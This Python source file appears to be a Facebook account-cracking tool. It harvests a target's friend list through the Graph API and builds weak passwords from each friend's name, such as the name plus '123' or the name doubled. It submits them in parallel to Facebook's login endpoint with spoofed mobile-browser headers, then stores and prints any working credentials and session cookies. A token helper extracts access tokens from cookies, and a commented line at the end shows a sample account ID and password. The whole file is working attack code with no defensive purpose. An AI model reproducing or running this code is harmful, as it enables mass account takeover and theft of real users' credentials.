import requests
import sqlite3, json, re, random
from bs4 import BeautifulSoup as b__sp_
from concurrent.futures import ThreadPoolExecutor as t__pe_

DB_PATH = '/sdcard/database.db'

class Facebook:
    def __init__(self) -> None:
        self.session = requests.session()

        with sqlite3.connect(DB_PATH) as db:
            x__ = db.cursor()
            x__.execute('SELECT * FROM user')
            y__ = x__.fetchone()

        self.session.cookies['cookie'] = y__[0]
        self.token = y__[1]

    def __dump_friendlist(self, id: str, cursor: bool= None) -> None:
        a__i_ = self.session.get(f'https://graph.facebook.com/{id}', params={'access_token': self.token, 'fields': 'name,friends.fields(id, name)' +(f'.after({cursor})' if cursor else '')}).json()

        if a__i_['friends']['data']:
            with sqlite3.connect(DB_PATH) as db:
                for i_ in a__i_['friends']['data']:
                    try:
                        db.cursor().execute('INSERT INTO dump (id, name) VALUES (?,?)', (i_['id'], i_['name']))
                        db.commit()
                    except sqlite3.IntegrityError:
                        pass

            return a__i_['friends']['paging']['cursors']['after']

    def dump_friendlist(self, id: str) -> None:
        c__zr_ = list(self.__dump_friendlist(id=id, cursor=None))
        
        for i_ in c__zr_:
            try: c__zr_.append(self.__dump_friendlist(id=id, cursor=i_))
            except Exception as e_: break

    def __login_method(self, id: str, password: str) -> None:
        with sqlite3.connect(DB_PATH) as db:
            x__ = db.cursor()
            x__.execute('SELECT * FROM useragents')
            y__ = x__.fetchone()

            with requests.session() as session:
                referer = f'https://m.facebook.com/login/device-based/password/?uid={id}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr'
                f__ = b__sp_(session.get(referer).text, 'html.parser')
                d__fm_ = {'jazoest': f__.find('input', {'name': 'jazoest'})['value'],'lsd': f__.find('input', {'name': 'lsd'})['value'],'prefill_contact_point': id,'trynum': '1','timezone': '240','lgndim': 'eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ==','lgnrnd': '052048_Gzhe','lgnjs': '1727785248','prefill_type': 'contact_point','first_prefill_type': 'contact_point','had_cp_prefilled': 'true','had_password_prefilled': 'false',}
                d__fm_.update({'email': id, 'pass': password})
                h__dr_ = {'Host': 'web.facebook.com','content-length': str(len(d__fm_)),'cache-control': 'max-age=0','sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-prefers-color-scheme': 'dark','origin': 'https://web.facebook.com','content-type': 'application/x-www-form-urlencoded','upgrade-insecure-requests': '1','user-agent': y__[0],'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': referer,'accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}


                p__dt_ = session.post('https://web.facebook.com/login/device-based/regular/login/?login_attempt=1', data=d__fm_, headers=h__dr_, allow_redirects=False)
                c__ = session.cookies.get_dict()
                c__st_ = '; '.join(f'{k_}={c_}' for k_, c_ in c__.items())
                if 'c_user' in c__:
                    try:
                        x__.execute('INSERT INTO success (id, password, cookie, useragents) VALUES (?,?,?,?)',(id, password, c__st_, y__[0]))
                        db.commit()
                    except sqlite3.IntegrityError:
                        pass
    
                    print(f'Success login [{id} |-| {password}]')
                    print('Useragents: '+ y__[0])
                    print('Cookie    : '+ c__st_)
    
                elif 'checkpoint' in c__.keys():
                    try:
                        x__.execute('INSERT INTO success (id, password, cookie, useragents) VALUES (?,?,?,?)',(id, password, c__st_, y__[0]))
                        db.commit()
                    except sqlite3.IntegrityError:
                        pass

                    print(f'Checkpoint login [{id} |-| {password}]')
                    print('Useragents: '+ y__[0])

    def __password(self, name) -> list:
        r__st_ = [name.lower()]
        for i_ in name.split(' '):
            for n_ in [123, 1234, 12345, 1, 2, 3, 4321, 321]:
                r__st_.append(i_ + str(n_))
            r__st_.append(i_ + i_)
            r__st_.append(i_ +' '+ i_)

        return r__st_

    def crack(self) -> None:
        s__ = 0

        with sqlite3.connect(DB_PATH) as db:
            x__ = db.cursor()
            x__.execute('SELECT * FROM dump')
            t__gt_ = x__.fetchall()
            x__.execute('SELECT * FROM success')
            s__cs_ = len(x__.fetchall())
            x__.execute('SELECT * FROM checkpoint')
            c__pn_ = len(x__.fetchall())
    
            print(f'Target avalibe: {len(t__gt_)} User ID')
            print(f'Author: Nyett\n')

            for i_ in t__gt_:
                id, name = i_[0], i_[1]
                password = self.__password(name=name)

                with t__pe_(max_workers=35) as t__:
                    for x_ in password:
                        c__rk_ = t__.submit(self.__login_method, id, x_)
                        
                s__ +=1
                x__.execute('SELECT * FROM success')
                s_cs__ = len(x__.fetchall())
                print(f'Cracking {s__}/{len(t__gt_)} ( ok: {s__cs_}| cp: {c__pn_} ) <Nyett>', end='\r')
                x__.execute('DELETE FROM dump WHERE id=?', (id,))
                x__.execute('INSERT INTO cache (id) VALUES (?)', (id,))
                db.commit()


def token(cookie: str) -> str:
    src = requests.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey', headers={'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate'}, cookies={'cookie': cookie}).headers
    if 'EAAB' in str(src):
        return re.search('"(EAAB.*?)",', str(src)).group(1)

    else:
        exit('LOGIN GAGAL')

        




        

        



#Facebook().crack()
#Facebook().login_method(id='hamad.alif.5', password='ivancok117')
#='Mozilla2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36')#id='100004481073503', password='akun123')
